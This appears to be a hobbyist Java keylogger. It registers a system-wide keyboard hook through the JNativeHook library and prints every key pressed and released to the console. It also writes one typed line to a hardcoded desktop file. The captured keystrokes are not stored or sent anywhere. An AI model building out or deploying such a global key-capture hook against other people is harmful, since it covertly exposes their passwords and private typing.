package keyLogs;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileWriter;
import java.io.PrintStream;
import java.io.PrintWriter;
import java.util.Scanner;

public class KeyLog implements NativeKeyListener
{
	public static void main(String args[]) throws FileNotFoundException
	{
		File f = new File("C:\\Users\\vivek\\Desktop\\KeyLog.txt");
		
		System.out.println("Type: ");
		Scanner s = new Scanner(System.in);
		String t = s.nextLine();
		FileWriter fw = null;
		BufferedWriter bw = null;


		try 
		{
			GlobalScreen.registerNativeHook();
		
		 fw = new FileWriter(f);
		 bw= new BufferedWriter(fw);
		 bw.write(t);
		 bw.newLine();
		 bw.close();
		 
			
			 
		}
		
		catch(NativeHookException e )
		{
			e.printStackTrace();
		}
		
		catch(Exception p)
		{
			p.printStackTrace();
		}
		
		GlobalScreen.addNativeKeyListener(new KeyLog());
		
	}

	@Override
	public void nativeKeyPressed(NativeKeyEvent e) 
	{
		System.out.println("Key Pressed " + NativeKeyEvent.getKeyText(e.getKeyCode()));
	}

	@Override
	public void nativeKeyReleased(NativeKeyEvent e) 
	{
		System.out.println("Key Released " + NativeKeyEvent.getKeyText(e.getKeyCode()));
	}

	@Override
	public void nativeKeyTyped(NativeKeyEvent e) 
	{
		
	}
	
	
}
